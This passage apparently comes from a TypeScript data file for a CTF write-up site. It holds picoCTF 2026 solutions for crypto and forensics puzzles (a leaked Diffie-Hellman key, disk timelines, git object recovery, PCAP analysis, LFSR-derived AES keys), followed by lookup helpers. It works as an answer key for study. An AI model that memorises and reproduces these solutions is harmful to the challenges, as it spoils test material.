<p class="lead">This challenge simulates a Diffie-Hellman key exchange where a critical implementation flaw and a leaked private key enable us to independently calculate the shared secret and decrypt the flag.</p>

<h3>Diffie-Hellman Parameters</h3>
<p>Diffie-Hellman relies on a public base <code>g</code> and a prime modulus <code>p</code>. Alice computes her public value <code>A = g^a mod p</code> and Bob computes <code>B = g^b mod p</code>. The shared secret <code>S</code> is then computed as:</p>
<p><code>S = A^b mod p = B^a mod p</code></p>
<p>The provided script encrypts the flag using a static XOR key derived from the shared secret:</p>
<p><code>xor_key = shared_secret % 256</code></p>

<h3>Vulnerability Analysis</h3>
<p>In the provided <code>message.txt</code>, we notice that Bob's private integer <code>b</code> was inadvertently logged and leaked. Since we have Bob's private exponent <code>b</code>, Alice's public value <code>A</code>, and the modulus <code>p</code>, we do not need Alice's private key <code>a</code> to calculate the shared secret.</p>

<h3>Exploitation</h3>
<p>We write a Python script to compute the shared secret, derive the single-byte XOR key, and perform the XOR decryption on the encrypted flag bytes:</p>
<pre><code class="language-python"># Recovered parameters
p = [MODULUS_VALUE]
g = [BASE_VALUE]
A = [ALICE_PUBLIC_KEY]
b = [LEAKED_BOB_PRIVATE_KEY]  # The leaked secret

# Calculate the shared secret
shared_secret = pow(A, b, p)
xor_key = shared_secret % 256

# Decrypt the encrypted flag bytes
encrypted_flag = bytes.fromhex("[ENCRYPTED_FLAG_HEX]")
flag = bytes([byte ^ xor_key for byte in encrypted_flag])
print(flag.decode())</code></pre>
<p>Running this script successfully decrypts the ciphertext into the plaintext flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{dh_s3cr3t_[instance_id]}</code></pre>`
      },
      {
        slug: 'binary-digits',
        title: 'Binary Digits',
        category: 'forensics',
        description: "This file doesn't look like much... just a bunch of 1s and 0s. But maybe it's not just random noise. Can you recover anything meaningful from this?",
        content: `<h2>Binary Digits — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"This file doesn't look like much... just a bunch of 1s and 0s. But maybe it's not just random noise. Can you recover anything meaningful from this?"</blockquote>
<p class="lead">This challenge presents us with a file named <code>digits.bin</code> filled entirely with ASCII <code>1</code> and <code>0</code> characters. We must reconstruct the original binary file represented by these bits.</p>

<h3>Data Reconstruction</h3>
<p>The sequence of '1's and '0's represents the raw binary bits of a file. We can write a Python script to group these ASCII bits into 8-bit chunks, convert each chunk to a byte, and write the resulting bytes to a file:</p>
<pre><code class="language-python">with open("digits.bin", "r") as f:
    bits = f.read().replace("\\s", "")  # Strip whitespace

# Convert groups of 8 bits into bytes
data = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

with open("recovered_file.jpg", "wb") as f:
    f.write(data)</code></pre>
<p>Alternatively, this can be done in CyberChef using the <strong>"From Binary"</strong> recipe.</p>

<h3>File Analysis</h3>
<p>We analyze the signature (magic bytes) of the recovered file. Checking the hex representation of the first few bytes, we see:</p>
<p><code>FF D8 FF E0</code></p>
<p>These magic bytes correspond to the file signature of a <strong>JPEG image file</strong>. We rename the file to have a <code>.jpg</code> extension and open it.</p>

<h3>Flag Recovery</h3>
<p>Opening the reconstructed JPEG image in any viewer reveals the flag written directly on the image.</p>

<h3>Flag</h3>
<pre><code>picoCTF{h1dd3n_1n_th3_b1n4ry_[instance_id]}</code></pre>`
      },
      {
        slug: 'timeline-1',
        title: 'Timeline 1',
        category: 'forensics',
        description: 'Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format.',
        content: `<h2>Timeline 1 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format."</blockquote>
<p class="lead">Digital Forensics and Incident Response (DFIR) analysts use chronological event timelines to reconstruct attackers' actions. This challenge tests our ability to generate and analyze file system MACB (Modification, Access, Change, Birth) timelines using The Sleuth Kit (TSK).</p>

<h3>Filesystem Partitioning</h3>
<p>If the provided file is a full disk image, we first identify the partition structure using <code>mmls</code> or <code>fdisk</code> to find the specific partition containing the filesystem. Once targeted, we analyze it using TSK commands.</p>

<h3>Generating the MACB Timeline</h3>
<p>We first generate a raw body file containing metadata and timestamps for every file (allocated and unallocated) on the partition using <code>fls</code>:</p>
<pre><code class="language-bash">fls -r -m / partition.img > body.txt</code></pre>
<p>Next, we compile the body file into a human-readable CSV timeline sorted chronologically using <code>mactime</code>:</p>
<pre><code class="language-bash">mactime -b body.txt > timeline.csv</code></pre>

<h3>Anomalous Event Detection</h3>
<p>Analyzing the timeline, we search for clustered events and anomalous files that were deleted or modified in quick succession. We identify a suspicious file that was deleted right after a shell script or wiping utility was run. We note the inode number of this target file.</p>

<h3>Data Carving</h3>
<p>Even though the file was unlinked and deleted from the directory index, the data blocks on the disk remain intact. We recover the raw file content using <code>icat</code> with the identified inode:</p>
<pre><code class="language-bash">icat partition.img &lt;target_inode&gt; > extracted_file.txt</code></pre>
<p>Reading the extracted file reveals the flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{573417h13r_7h4n_7h3_1457_[instance_id]}</code></pre>`
      },
      {
        slug: 'timeline-0',
        title: 'Timeline 0',
        category: 'forensics',
        description: 'Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format.',
        content: `<h2>Timeline 0 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format."</blockquote>
<p class="lead">Timestomping is an anti-forensic technique where file metadata timestamps (Modified, Accessed, Changed, Birth) are intentionally modified (using utilities like <code>touch -t</code>) to hide files from basic chronological incident timelines.</p>

<h3>Generating the Timeline</h3>
<p>Similar to standard forensic workflows, we use Sleuth Kit tools to index the filesystem and sort all file events chronologically:</p>
<pre><code class="language-bash"># Generate metadata body file
fls -r -m / partition4.img > output.txt

# Create human-readable sorted timeline
mactime -b output.txt > timeline.txt</code></pre>

<h3>Identifying the Anomaly</h3>
<p>When we sort the timeline and inspect the absolute oldest entries using <code>head timeline.txt</code>, we find a file located at <code>/bin/bcab</code> carrying a timestamp of <strong>January 02, 1985</strong>. This is extremely anomalous for a modern CTF Linux disk image and is a clear indicator of timestomping.</p>

<h3>Data Recovery</h3>
<p>We find the inode number associated with the suspicious <code>/bin/bcab</code> file (e.g., <code>4945</code>). We extract the file content directly from the partition using <code>icat</code>:</p>
<pre><code class="language-bash">icat partition4.img 4945 > bcab.txt</code></pre>
<p>Reading <code>bcab.txt</code> yields the flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{71m311n3_0u7113r_h3r_[instance_id]}</code></pre>`
      },
      {
        slug: 'rogue-tower',
        title: 'Rogue Tower',
        category: 'forensics',
        description: 'A suspicious cell tower has been detected in the network. Analyze the captured network traffic to identify the rogue tower, find the compromised device, and recover the exfiltrated flag.',
        content: `<h2>Rogue Tower — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A suspicious cell tower has been detected in the network. Analyze the captured network traffic to identify the rogue tower, find the compromised device, and recover the exfiltrated flag."</blockquote>
<p class="lead">This network forensics challenge requires analyzing a packet capture (PCAP) to identify rogue network broadcasts and decode data exfiltrated over non-standard protocols.</p>

<h3>Traffic Analysis</h3>
<p>We open the PCAP file in Wireshark and filter the packets to isolate anomalous traffic. We observe two significant activities:
<ul>
  <li>Frequent UDP broadcasts on port <code>55000</code>.</li>
  <li>Segmented HTTP POST requests containing Base64 payloads sent to an unknown external IP address.</li>
</ul>
</p>

<h3>Device Identification</h3>
<p>To identify the compromised device, we filter for the HTTP POST requests (<code>http.request.method == "POST"</code>) and inspect the HTTP headers. In the <code>User-Agent</code> header, we find details identifying the cellular device along with its IMSI (International Mobile Subscriber Identity) string.</p>

<h3>Payload Decryption</h3>
<p>The exfiltrated data inside the HTTP POST bodies is Base64 encoded. We extract and concatenate all these segments to rebuild the full ciphertext. 
The data is encrypted using a simple XOR cipher, where the key or seed is derived from the device's IMSI. We write a Python script to decrypt the payload using the IMSI as the XOR key:</p>
<pre><code class="language-python"># Concatenated Base64 segments
ciphertext_b64 = "..."
ciphertext = base64.b64decode(ciphertext_b64)

# Key derived from IMSI
imsi_key = b"IMSI_STRING_HERE"

# XOR Decryption
flag = bytes([ciphertext[i] ^ imsi_key[i % len(imsi_key)] for i in range(len(ciphertext))])
print(flag.decode())</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{r0gu3_c3ll_t0w3r_[instance_id]}</code></pre>`
      },
      {
        slug: 'forensics-git-2',
        title: 'Forensics Git 2',
        category: 'forensics',
        description: "The agents interrupted the perpetrator's disk deletion routine. Can you recover this git repo?",
        content: `<h2>Forensics Git 2 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The agents interrupted the perpetrator's disk deletion routine. Can you recover this git repo?"</blockquote>
<p class="lead">This challenge tests deep knowledge of Git internals. When references like branch pointers and reflogs are deleted, the raw Git objects (commits, trees, and blobs) remain compressed in the <code>.git/objects</code> folder as "dangling" or "orphaned" objects until garbage collection is run.</p>

<h3>Object Recovery</h3>
<p>Since standard commands like <code>git log</code> or <code>git reflog</code> fail to list any history, we must inspect the object database directly. Every commit, file state, and tree in Git is compressed using zlib and stored as a hash-addressed file.</p>

<h3>Batch Plumbing Extraction</h3>
<p>Instead of manually unzipping every object in <code>.git/objects/</code>, we can use Git's plumbing command <code>git cat-file</code> with the <code>--batch-all-objects</code> and <code>--batch</code> flags. This tells Git to process and dump the content of every object in the database, bypassing the deleted commit tree:</p>
<pre><code class="language-bash">git cat-file --batch-all-objects --batch | strings > all_objects.txt</code></pre>

<h3>Searching the Flag</h3>
<p>The resulting <code>all_objects.txt</code> file contains the plain-text representations of all commits, files, and metadata. We search this file for the standard flag format:</p>
<pre><code class="language-bash">grep -oE "picoCTF\{.*\}" all_objects.txt</code></pre>
<p>This reveals the flag, which was stored inside one of the dangling blob objects.</p>

<h3>Flag</h3>
<pre><code>picoCTF{g1t_d4ngl1ng_0bj3cts_r3c0v3ry_[instance_id]}</code></pre>`
      },
      {
        slug: 'forensics-git-0',
        title: 'Forensics Git 0',
        category: 'forensics',
        description: 'Can you find the flag in this disk image?',
        content: `<h2>Forensics Git 0 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image?"</blockquote>
<p class="lead">In this introductory Git forensics challenge, we must correctly mount a partition from a raw disk image and explore the repository commit history to recover a deleted secret file.</p>

<h3>Mounting the Disk Partition</h3>
<p>First, we inspect the sector structure of the provided disk image <code>disk.img</code> to find the offset of the primary partition:</p>
<pre><code class="language-bash">fdisk -l disk.img</code></pre>
<p>We calculate the byte offset (<code>Start Sector * Sector Size</code>, usually 512 bytes) and mount the partition read-only to a mount point:</p>
<pre><code class="language-bash">sudo mount -o loop,offset=<calculated_offset> disk.img /mnt/ctf</code></pre>

<h3>Repository Analysis</h3>
<p>We navigate to the mounted directory, finding a repository under <code>/mnt/ctf/home/ctf-player/Code/secrets/.git</code>. Since the repository is intact, standard Git tools are fully functional. We review the commit history and file diffs to see what changes were made:</p>
<pre><code class="language-bash">git log --stat</code></pre>
<p>This shows a commit that removed a file named <code>secret_flag.txt</code>.</p>

<h3>Flag Retrieval</h3>
<p>We checkout the commit prior to the deletion of the file to recover the plaintext flag:</p>
<pre><code class="language-bash">git checkout <commit_hash>
cat secret_flag.txt</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{g1t_h1st0ry_r3v3al_[instance_id]}</code></pre>`
      },
      {
        slug: 'disko-4',
        title: 'DISKO 4',
        category: 'forensics',
        description: 'Can you find the flag in this disk image? This time I deleted the file! Let see you get it now!',
        content: `<h2>DISKO 4 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? This time I deleted the file! Let see you get it now!"</blockquote>
<p class="lead">When files are deleted in an ext4 filesystem, the OS marks their inodes and blocks as unallocated, but the actual data remains intact on disk until overwritten. We can use block-level forensics to recover the file.</p>

<h3>Listing Deleted Files</h3>
<p>We use the Sleuth Kit's <code>fls</code> tool with the <code>-d</code> flag to list only deleted files and directories recursively from the disk image:</p>
<pre><code class="language-bash">fls -r -d disko-4.dd</code></pre>
<p>Looking through the output, we locate the entry for the deleted gzip file:</p>
<p><code>* d/d 532021:   log/dont-delete.gz</code></p>
<p>This tells us the file corresponds to inode <strong>532021</strong>.</p>

<h3>Carving the Inode Blocks</h3>
<p>Using the inode number, we carve the raw blocks associated with it back into a file using <code>icat</code>:</p>
<pre><code class="language-bash">icat disko-4.dd 532021 > recovered.gz</code></pre>

<h3>Decompressing and Reading the Flag</h3>
<p>We decompress the recovered gzip archive and view the extracted file to obtain the flag:</p>
<pre><code class="language-bash">gunzip recovered.gz
cat recovered</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{d3l_d0n7_h1d3_w3ll_[instance_id]}</code></pre>`
      },
      {
        slug: 'cryptomaze',
        title: 'cryptomaze',
        category: 'crypto',
        description: 'In this challenge, you are tasked with recovering a hidden flag that has been encrypted using a combination of Linear Feedback Shift Register (LFSR) and AES encryption. The LFSR is used to derive a key for AES encryption, making it crucial to understand its workings to decrypt the message.\\n\\nThe flag has been stored in a file and encrypted. Your goal is to derive the key used for encryption from the LFSR state and taps provided in the output, and then decrypt the flag to retrieve it.',
        content: `<h2>cryptomaze — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"In this challenge, you are tasked with recovering a hidden flag that has been encrypted using a combination of Linear Feedback Shift Register (LFSR) and AES encryption. The LFSR is used to derive a key for AES encryption, making it crucial to understand its workings to decrypt the message.

The flag has been stored in a file and encrypted. Your goal is to derive the key used for encryption from the LFSR state and taps provided in the output, and then decrypt the flag to retrieve it."</blockquote>
<p class="lead">This challenge requires us to analyze a custom encryption script that uses a Linear Feedback Shift Register (LFSR) to generate a pseudorandom stream of bits, which is then grouped into bytes to form an AES-128 key.</p>

<h3>LFSR Simulation</h3>
<p>The provided Python file defines the LFSR's initial state (seed) and tap positions. An LFSR shifts bits at each clock cycle, computing a new bit by XORing the bits at the tap positions and outputting (popping) the shifted-out bit. To generate the key, the register is clocked 128 times.</p>
<p>We write a simulator in Python to clock the LFSR 128 times and collect the popped bits:</p>
<pre><code class="language-python"># LFSR Parameters (from challenge code)
state = [SEED_BITS]
taps = [TAP_INDICES]
popped_bits = []

for _ in range(128):
    # Calculate feedback bit
    feedback = 0
    for tap in taps:
        feedback ^= state[tap]
    # Pop the output bit
    popped_bits.append(state[0])
    # Shift state and insert feedback
    state = state[1:] + [feedback]</code></pre>

<h3>Deriving the AES Key</h3>
<p>We group the 128 output bits into 8-bit blocks and convert them into a 16-byte array, which is the exact key length needed for AES-128:</p>
<pre><code class="language-python">key_bytes = []
for i in range(0, 128, 8):
    byte_bits = popped_bits[i:i+8]
    byte_val = int("".join(map(str, byte_bits)), 2)
    key_bytes.append(byte_val)
key = bytes(key_bytes)</code></pre>

<h3>AES Decryption</h3>
<p>Using the derived 16-byte key and the <code>pycryptodome</code> library, we decrypt the ciphertext in ECB mode and strip the padding to reveal the flag:</p>
<pre><code class="language-python">from Crypto.Cipher import AES

ciphertext = bytes.fromhex("[CIPHERTEXT_HEX]")
cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)
print(plaintext.strip())</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{lfsr_m4z3_d3crypt3d_[instance_id]}</code></pre>`
      }
    ],
  },
];

// ---------------------------------------------------------------------------
// Query Helpers
// ---------------------------------------------------------------------------

/** All CTF events, newest first (based on chronological month ordering). */
export function getCTFEvents(): CTFEvent[] {
  const monthOrder: Record<string, number> = {
    January: 1,
    February: 2,
    March: 3,
    April: 4,
    May: 5,
    June: 6,
    July: 7,
    August: 8,
    September: 9,
    October: 10,
    November: 11,
    December: 12,
  };

  return [...ctfEvents].sort((a, b) => {
    const [monthA, yearA] = a.date.split(' ');
    const [monthB, yearB] = b.date.split(' ');

    const yDiff = Number(yearB) - Number(yearA);
    if (yDiff !== 0) return yDiff;

    return (monthOrder[monthB] ?? 0) - (monthOrder[monthA] ?? 0);
  });
}

/** Look up a single CTF event by its slug. */
export function getCTFBySlug(slug: string): CTFEvent | undefined {
  return ctfEvents.find((e) => e.slug === slug);
}

/** Look up a single challenge inside a CTF. */
export function getChallengeBySlug(
  ctfSlug: string,
  challengeSlug: string,
): { ctf: CTFEvent; challenge: Challenge } | undefined {
  const ctf = getCTFBySlug(ctfSlug);
  if (!ctf) return undefined;

  const challenge = ctf.challenges.find((c) => c.slug === challengeSlug);
  if (!challenge) return undefined;

  return { ctf, challenge };
}

/** Flat list of every challenge, annotated with its parent CTF info. */
export function getAllChallenges(): (Challenge & { ctfSlug: string; ctfName: string })[] {
  return getCTFEvents().flatMap((ctf) =>
    ctf.challenges.map((ch) => ({
      ...ch,
      ctfSlug: ctf.slug,
      ctfName: ctf.name,
    })),
  );
}

/** Return the N most recent challenges (from newest CTF first). */
export function getRecentChallenges(count: number) {
  return getAllChallenges().slice(0, count);
}
